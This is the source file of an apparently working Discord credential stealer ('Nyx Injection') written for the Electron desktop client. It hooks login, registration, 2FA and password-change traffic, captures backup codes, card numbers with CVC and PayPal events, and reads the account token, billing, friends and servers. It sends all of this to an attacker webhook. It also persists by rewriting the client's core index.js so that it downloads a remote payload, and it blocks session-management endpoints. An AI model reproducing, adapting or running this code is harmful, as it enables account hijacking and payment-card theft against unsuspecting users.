const fs = require('fs');
const https = require("https");
const args = process.argv;
const path = require("path");
const querystring = require("querystring");
const {
  BrowserWindow,
  session
} = require("electron");
const CONFIG = {
  'webhook': "%WEBHOOK%",
  'injection_url': "https://raw.githubusercontent.com/bomboclat-cyber/injection/main/injection.js",
  'filters': {
    'urls': ["/auth/login", "/auth/register", "/mfa/totp", "/mfa/codes-verification", '/users/@me']
  },
  'filters2': {
    'urls': ["wss://remote-auth-gateway.discord.gg/*", "https://discord.com/api/v*/auth/sessions", "https://*.discord.com/api/v*/auth/sessions", 'https://discordapp.com/api/v*/auth/sessions']
  },
  'payment_filters': {
    'urls': ["https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts", "https://api.stripe.com/v*/tokens"]
  },
  'API': "https://discord.com/api/v9/users/@me",
  'badges': {
    'Discord_Emloyee': {
      'Value': 0x1,
      'Emoji': '<:8485discordemployee:1163172252989259898>',
      'Rare': true
    },
    'Partnered_Server_Owner': {
      'Value': 0x2,
      'Emoji': '<:9928discordpartnerbadge:1163172304155586570>',
      'Rare': true
    },
    'HypeSquad_Events': {
      'Value': 0x4,
      'Emoji': "<:9171hypesquadevents:1163172248140660839>",
      'Rare': true
    },
    'Bug_Hunter_Level_1': {
      'Value': 0x8,
      'Emoji': '<:4744bughunterbadgediscord:1163172239970140383>',
      'Rare': true
    },
    'Early_Supporter': {
      'Value': 0x200,
      'Emoji': "<:5053earlysupporter:1163172241996005416>",
      'Rare': true
    },
    'Bug_Hunter_Level_2': {
      'Value': 0x4000,
      'Emoji': '<:1757bugbusterbadgediscord:1163172238942543892>',
      'Rare': true
    },
    'Early_Verified_Bot_Developer': {
      'Value': 0x20000,
      'Emoji': "<:1207iconearlybotdeveloper:1163172236807639143>",
      'Rare': true
    },
    'House_Bravery': {
      'Value': 0x40,
      'Emoji': "<:6601hypesquadbravery:1163172246492287017>",
      'Rare': false
    },
    'House_Brilliance': {
      'Value': 0x80,
      'Emoji': '<:6936hypesquadbrilliance:1163172244474822746>',
      'Rare': false
    },
    'House_Balance': {
      'Value': 0x100,
      'Emoji': "<:5242hypesquadbalance:1163172243417858128>",
      'Rare': false
    },
    'Active_Developer': {
      'Value': 0x400000,
      'Emoji': '<:1207iconactivedeveloper:1163172534443851868>',
      'Rare': false
    },
    'Certified_Moderator': {
      'Value': 0x40000,
      'Emoji': "<:4149blurplecertifiedmoderator:1163172255489085481>",
      'Rare': true
    },
    'Spammer': {
      'Value': 0x100080,
      'Emoji': '⌨️',
      'Rare': false
    }
  }
};
const executeJS = _0x1d811d => {
  const _0x50cd5b = BrowserWindow.getAllWindows()[0x0];
  return _0x50cd5b.webContents.executeJavaScript(_0x1d811d, true);
};
const clearAllUserData = () => {
  executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
  executeJS("location.reload()");
};
const getToken = async () => await executeJS("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");
const request = async (_0x3c5be3, _0x2f84ee, _0xfe7a75, _0x504881) => {
  _0x2f84ee = new URL(_0x2f84ee);
  const _0x27cbeb = {
    'protocol': _0x2f84ee.protocol,
    'hostname': _0x2f84ee.host,
    'path': _0x2f84ee.pathname,
    'method': _0x3c5be3,
    'headers': {
      'Access-Control-Allow-Origin': '*'
    }
  };
  if (_0x2f84ee.search) {
    _0x27cbeb.path += _0x2f84ee.search;
  }
  for (const _0xa0dc43 in _0xfe7a75) _0x27cbeb.headers[_0xa0dc43] = _0xfe7a75[_0xa0dc43];
  const _0x8b40e4 = https.request(_0x27cbeb);
  if (_0x504881) {
    _0x8b40e4.write(_0x504881);
  }
  _0x8b40e4.end();
  return new Promise((_0x1817c1, _0x2052c2) => {
    _0x8b40e4.on("response", _0x2c8328 => {
      let _0x46bb87 = '';
      _0x2c8328.on("data", _0xa775f2 => _0x46bb87 += _0xa775f2);
      _0x2c8328.on("end", () => _0x1817c1(_0x46bb87));
    });
  });
};
const hooker = async (_0x40ed36, _0x182bdf, _0x113dbb) => {
  _0x40ed36.username = "Nyx Injection";
  _0x40ed36.avatar_url = "https://i.ibb.co/NF7mxHN/nyxstealer.png";
  _0x40ed36.embeds[0x0].author = {
    'name': _0x113dbb.username
  };
  _0x40ed36.embeds[0x0].thumbnail = {
    'url': "https://cdn.discordapp.com/avatars/" + _0x113dbb.id + '/' + _0x113dbb.avatar + ".webp"
  };
  _0x40ed36.embeds[0x0].footer = {
    'text': "Nyx Discord Injection",
    'icon_url': "https://i.ibb.co/NF7mxHN/nyxstealer.png"
  };
  _0x40ed36.embeds[0x0].title = "Account Information";
  const _0x49a952 = getNitro(_0x113dbb.premium_type);
  const _0x3fac26 = getBadges(_0x113dbb.flags);
  const _0x100010 = await getBilling(_0x182bdf);
  const _0x48e345 = await getFriends(_0x182bdf);
  const _0x346d5a = await getServers(_0x182bdf);
  _0x40ed36.embeds[0x0].fields.push({
    'name': 'Token',
    'value': "```" + _0x182bdf + "```",
    'inline': false
  }, {
    'name': 'Nitro',
    'value': "```" + _0x49a952 + '```',
    'inline': true
  }, {
    'name': "Badges",
    'value': '```' + _0x3fac26 + '```',
    'inline': true
  }, {
    'name': "Billing",
    'value': "```" + _0x100010 + "```",
    'inline': true
  });
  _0x40ed36.embeds.push({
    'title': "Total Friends: " + _0x48e345.totalFriends,
    'description': _0x48e345.message
  }, {
    'title': "Total Servers: " + _0x346d5a.totalGuilds,
    'description': _0x346d5a.message
  });
  for (const _0x59659c in _0x40ed36.embeds) {
    _0x40ed36.embeds[_0x59659c].color = 0xffffff;
  }
  await request("POST", "%WEBHOOK%", {
    'Content-Type': "application/json"
  }, JSON.stringify(_0x40ed36));
};
const fetch = async (_0x276567, _0x2f6559) => {
  return JSON.parse(await request('GET', "https://discord.com/api/v9/users/@me" + _0x276567, _0x2f6559));
};
const fetchAccount = async _0x56b4fa => await fetch('', {
  'Authorization': _0x56b4fa
});
const fetchBilling = async _0x31ec8b => await fetch('/billing/payment-sources', {
  'Authorization': _0x31ec8b
});
const fetchServers = async _0xc76fd6 => await fetch("/guilds?with_counts=true", {
  'Authorization': _0xc76fd6
});
const fetchFriends = async _0x102378 => await fetch("/relationships", {
  'Authorization': _0x102378
});
const getNitro = _0x5e360f => {
  switch (_0x5e360f) {
    case 0x1:
      return " Nitro Classic ";
    case 0x2:
      return " Nitro Boost ";
    case 0x3:
      return " Nitro Basic ";
    default:
      return " Null ";
  }
};
const getBadges = _0x3577d9 => {
  let _0x4ceb41 = '';
  for (const _0x2f57a5 in CONFIG.badges) {
    let _0xd2ee62 = CONFIG.badges[_0x2f57a5];
    if ((_0x3577d9 & _0xd2ee62.Value) == _0xd2ee62.Value) {
      _0x4ceb41 += _0xd2ee62.Emoji + " ";
    }
  }
  return _0x4ceb41 || " Null ";
};
const getRareBadges = _0x369750 => {
  let _0x5271cc = '';
  for (const _0x40ac2c in CONFIG.badges) {
    let _0xbe84b5 = CONFIG.badges[_0x40ac2c];
    if ((_0x369750 & _0xbe84b5.Value) == _0xbe84b5.Value && _0xbe84b5.Rare) {
      _0x5271cc += _0xbe84b5.Emoji + " ";
    }
  }
  return _0x5271cc;
};
const getBilling = async _0x29cfa9 => {
  const _0x84e6ee = await fetchBilling(_0x29cfa9);
  let _0x499f46 = '';
  _0x84e6ee.forEach(_0x19d586 => {
    if (!_0x19d586.invalid) {
      switch (_0x19d586.type) {
        case 0x1:
          _0x499f46 += "💳 ";
          break;
        case 0x2:
          _0x499f46 += "<:paypal:1148653305376034967> ";
          break;
      }
    }
  });
  return _0x499f46 || " Null ";
};
const getFriends = async _0x3fd72c => {
  const _0x54b232 = await fetchFriends(_0x3fd72c);
  const _0x34446b = _0x54b232.filter(_0x3955c1 => {
    return _0x3955c1.type == 0x1;
  });
  let _0x74f399 = '';
  for (const _0x2a37d7 of _0x34446b) {
    var _0x3b6e01 = getRareBadges(_0x2a37d7.user.public_flags);
    if (_0x3b6e01 != '') {
      if (!_0x74f399) {
        _0x74f399 = "** `` Rare Friends `` **\n";
      }
      _0x74f399 += _0x3b6e01 + " " + _0x2a37d7.user.username + "\n";
    }
  }
  _0x74f399 = _0x74f399 || "** `` No Rare Friends `` **";
  return {
    'message': _0x74f399,
    'totalFriends': _0x54b232.length
  };
};
const getServers = async _0x5cb8a2 => {
  const _0x21c867 = await fetchServers(_0x5cb8a2);
  const _0x7c2f52 = _0x21c867.filter(_0x296aea => _0x296aea.permissions == "562949953421311" || _0x296aea.permissions == "2251799813685247");
  let _0x705f6d = '';
  for (const _0x570e53 of _0x7c2f52) {
    if (_0x705f6d === '') {
      _0x705f6d += "** `` Rare Servers `` **\n";
    }
    _0x705f6d += (_0x570e53.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin") + " | " + _0x570e53.name + "\n" + ("```" + _0x570e53.approximate_member_count + " Members```\n");
  }
  _0x705f6d = _0x705f6d || "** `` No Rare Servers `` **";
  return {
    'message': _0x705f6d,
    'totalGuilds': _0x21c867.length
  };
};
const EmailPassToken = async (_0x3b0fc2, _0x6c015f, _0x3653a2, _0x38e5a1) => {
  const _0x1564a5 = await fetchAccount(_0x3653a2);
  const _0x185f7e = {
    'content': "** `` " + _0x1564a5.username + " Just " + _0x38e5a1 + "! `` **",
    'embeds': [{
      'fields': [{
        'name': "Email",
        'value': '`' + _0x3b0fc2 + '`',
        'inline': true
      }, {
        'name': 'Password',
        'value': '`' + _0x6c015f + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x185f7e, _0x3653a2, _0x1564a5);
};
const BackupCodesViewed = async (_0x567ad0, _0x4c576e) => {
  const _0x5541e9 = await fetchAccount(_0x4c576e);
  const _0x301095 = _0x567ad0.filter(_0x5768d2 => {
    return _0x5768d2.consumed === false;
  });
  let _0x1be42d = '';
  for (let _0x3cbeeb of _0x301095) {
    _0x1be42d += _0x3cbeeb.code.substr(0x0, 0x4) + '-' + _0x3cbeeb.code.substr(0x4) + "\n";
  }
  const _0x2db487 = {
    'content': "** ``" + _0x5541e9.username + " Just Viewed His 2FA Backup Codes! `` **",
    'embeds': [{
      'fields': [{
        'name': "Backup Codes",
        'value': "```" + _0x1be42d + "```",
        'inline': false
      }, {
        'name': "Email",
        'value': '`' + _0x5541e9.email + '`',
        'inline': true
      }, {
        'name': "Phone",
        'value': '`' + (_0x5541e9.phone || 'None') + '`',
        'inline': true
      }]
    }]
  };
  hooker(_0x2db487, _0x4c576e, _0x5541e9);
};
const PasswordChanged = async (_0x2998c2, _0x1564f1, _0x40dbbc) => {
  const _0x31f78b = await fetchAccount(_0x40dbbc);
  const _0x5db577 = {
    'content': "** `` " + _0x31f78b.username + " Just Changed His Password! `` **",
    'embeds': [{
      'fields': [{
        'name': "New Password",
        'value': "```" + _0x2998c2 + "```",
        'inline': true
      }, {
        'name': "Old Password",
        'value': "```" + _0x1564f1 + "```",
        'inline': true
      }]
    }]
  };
  hooker(_0x5db577, _0x40dbbc, _0x31f78b);
};
const CreditCardAdded = async (_0x2d04a4, _0x1eabb0, _0x46f9d2, _0x28d159, _0x136d98) => {
  const _0x5aa9c0 = await fetchAccount(_0x136d98);
  const _0x5ed697 = {
    'content': "** `` " + _0x5aa9c0.username + " Just Added A Credit Card! `` **",
    'embeds': [{
      'fields': [{
        'name': "Number",
        'value': "```" + _0x2d04a4 + '```',
        'inline': true
      }, {
        'name': 'CVC',
        'value': "```" + _0x1eabb0 + "```",
        'inline': true
      }, {
        'name': "Expiration",
        'value': "```" + _0x46f9d2 + '/' + _0x28d159 + "```",
        'inline': true
      }]
    }]
  };
  hooker(_0x5ed697, _0x136d98, _0x5aa9c0);
};
const PaypalAdded = async _0x13655a => {
  const _0x3a29c5 = await fetchAccount(_0x13655a);
  const _0x309179 = {
    'content': "** `` " + _0x3a29c5.username + " Just Added A PayPayl Account! `` **",
    'embeds': [{
      'fields': [{
        'name': "Email",
        'value': "```" + _0x3a29c5.email + "```",
        'inline': true
      }, {
        'name': 'Phone',
        'value': '```' + (_0x3a29c5.phone || 'None') + "```",
        'inline': true
      }]
    }]
  };
  hooker(_0x309179, _0x13655a, _0x3a29c5);
};
const discordPath = function () {
  const _0x3639f0 = args[0x0].split(path.sep).slice(0x0, -0x1).join(path.sep);
  let _0x282d29;
  if (process.platform === "win32") {
    _0x282d29 = path.join(_0x3639f0, 'resources');
  } else if (process.platform === "darwin") {
    _0x282d29 = path.join(_0x3639f0, "Contents", 'Resources');
  }
  if (fs.existsSync(_0x282d29)) {
    return {
      'resourcePath': _0x282d29,
      'app': _0x3639f0
    };
  }
  return {
    'undefined': undefined,
    'undefined': undefined
  };
}();
async function initiation() {
  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
    fs.rmdirSync(path.join(__dirname, "initiation"));
    const _0xa85b8a = await getToken();
    if (!_0xa85b8a) {
      return;
    }
    const _0x3bc8b9 = await fetchAccount(_0xa85b8a);
    const _0x3ee962 = {
      'content': "** `` " + _0x3bc8b9.username + " Just Got Injected! `` **",
      'embeds': [{
        'fields': [{
          'name': 'Email',
          'value': "```" + _0x3bc8b9.email + "```",
          'inline': true
        }, {
          'name': "Phone",
          'value': "```" + (_0x3bc8b9.phone || "None") + "```",
          'inline': true
        }]
      }]
    };
    await hooker(_0x3ee962, _0xa85b8a, _0x3bc8b9);
    clearAllUserData();
  }
  const {
    resourcePath: _0xfc75b7,
    app: _0x2ce671
  } = discordPath;
  if (_0xfc75b7 === undefined || _0x2ce671 === undefined) {
    return;
  }
  const _0x39b828 = path.join(_0xfc75b7, "app");
  const _0x34d35e = path.join(_0x39b828, "package.json");
  const _0x1069cf = path.join(_0x39b828, "index.js");
  const _0x59fc08 = fs.readdirSync(_0x2ce671 + "\\modules\\").filter(_0x179a89 => /discord_desktop_core-+?/.test(_0x179a89))[0x0];
  const _0x221c87 = _0x2ce671 + "\\modules\\" + _0x59fc08 + "\\discord_desktop_core\\index.js";
  const _0x50639d = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
  if (!fs.existsSync(_0x39b828)) {
    fs.mkdirSync(_0x39b828);
  }
  if (fs.existsSync(_0x34d35e)) {
    fs.unlinkSync(_0x34d35e);
  }
  if (fs.existsSync(_0x1069cf)) {
    fs.unlinkSync(_0x1069cf);
  }
  if (process.platform === "win32" || process.platform === "darwin") {
    fs.writeFileSync(_0x34d35e, JSON.stringify({
      'name': "discord",
      'main': 'index.js'
    }, null, 0x4));
    const _0x57c31e = "const fs = require('fs'), https = require('https');\n  const indexJs = '" + _0x221c87 + "';\n  const bdPath = '" + _0x50639d + "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" + "https://raw.githubusercontent.com/bomboclat-cyber/injection/main/injection.js" + "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('https://discord.com/api/webhooks/1269793628813787268/jQlXQiTwgbS9bd7lnIN_miuQzJeIt0OGgakLLP44E3wuB0DghqumpjvQIC_RUz3BHfrr', '" + "%WEBHOOK%" + "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" + path.join(_0xfc75b7, "app.asar") + "')\n  if (fs.existsSync(bdPath)) require(bdPath);";
    fs.writeFileSync(_0x1069cf, _0x57c31e.replace(/\\/g, "\\\\"));
  }
}
let email = '';
let password = '';
let initiationCalled = false;
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0x0];
  if (!mainWindow) {
    return;
  }
  mainWindow.webContents['debugger'].attach("1.3");
  mainWindow.webContents['debugger'].on("message", async (_0x387d64, _0x5ca4d4, _0x204e98) => {
    if (!initiationCalled) {
      await initiation();
      initiationCalled = true;
    }
    if (_0x5ca4d4 !== "Network.responseReceived") {
      return;
    }
    if (!CONFIG.filters.urls.some(_0x5486af => _0x204e98.response.url.endsWith(_0x5486af))) {
      return;
    }
    if (![0xc8, 0xca].includes(_0x204e98.response.status)) {
      return;
    }
    const _0x275958 = await mainWindow.webContents['debugger'].sendCommand("Network.getResponseBody", {
      'requestId': _0x204e98.requestId
    });
    const _0x414c63 = JSON.parse(_0x275958.body);
    const _0x1539b9 = await mainWindow.webContents["debugger"].sendCommand("Network.getRequestPostData", {
      'requestId': _0x204e98.requestId
    });
    const _0x588c2e = JSON.parse(_0x1539b9.postData);
    switch (true) {
      case _0x204e98.response.url.endsWith("/login"):
        if (!_0x414c63.token) {
          email = _0x588c2e.login;
          password = _0x588c2e.password;
          return;
        }
        EmailPassToken(_0x588c2e.login, _0x588c2e.password, _0x414c63.token, "logged in");
        break;
      case _0x204e98.response.url.endsWith("/register"):
        EmailPassToken(_0x588c2e.email, _0x588c2e.password, _0x414c63.token, "signed up");
        break;
      case _0x204e98.response.url.endsWith("/totp"):
        EmailPassToken(email, password, _0x414c63.token, "logged in with 2FA");
        break;
      case _0x204e98.response.url.endsWith("/codes-verification"):
        BackupCodesViewed(_0x414c63.backup_codes, await getToken());
        break;
      case _0x204e98.response.url.endsWith("/@me"):
        if (!_0x588c2e.password) {
          return;
        }
        if (_0x588c2e.email) {
          EmailPassToken(_0x588c2e.email, _0x588c2e.password, _0x414c63.token, "changed his email to **" + _0x588c2e.email + '**');
        }
        if (_0x588c2e.new_password) {
          PasswordChanged(_0x588c2e.new_password, _0x588c2e.password, _0x414c63.token);
        }
        break;
    }
  });
  mainWindow.webContents['debugger'].sendCommand('Network.enable');
  mainWindow.on('closed', () => {
    createWindow();
  });
};
createWindow();
session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (_0x1f63d4, _0x4727a0) => {
  if (![0xc8, 0xca].includes(_0x1f63d4.statusCode)) {
    return;
  }
  if (_0x1f63d4.method != 'POST') {
    return;
  }
  switch (true) {
    case _0x1f63d4.url.endsWith("tokens"):
      const _0x413133 = querystring.parse(Buffer.from(_0x1f63d4.uploadData[0x0].bytes).toString());
      CreditCardAdded(_0x413133["card[number]"], _0x413133['card[cvc]'], _0x413133["card[exp_month]"], _0x413133["card[exp_year]"], await getToken());
      break;
    case _0x1f63d4.url.endsWith("paypal_accounts"):
      PaypalAdded(await getToken());
      break;
  }
});
session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (_0x1df621, _0x4047e3) => {
  if (_0x1df621.url.startsWith("wss://remote-auth-gateway") || _0x1df621.url.endsWith('auth/sessions')) {
    return _0x4047e3({
      'cancel': true
    });
  }
});
module.exports = require('./core.asar');
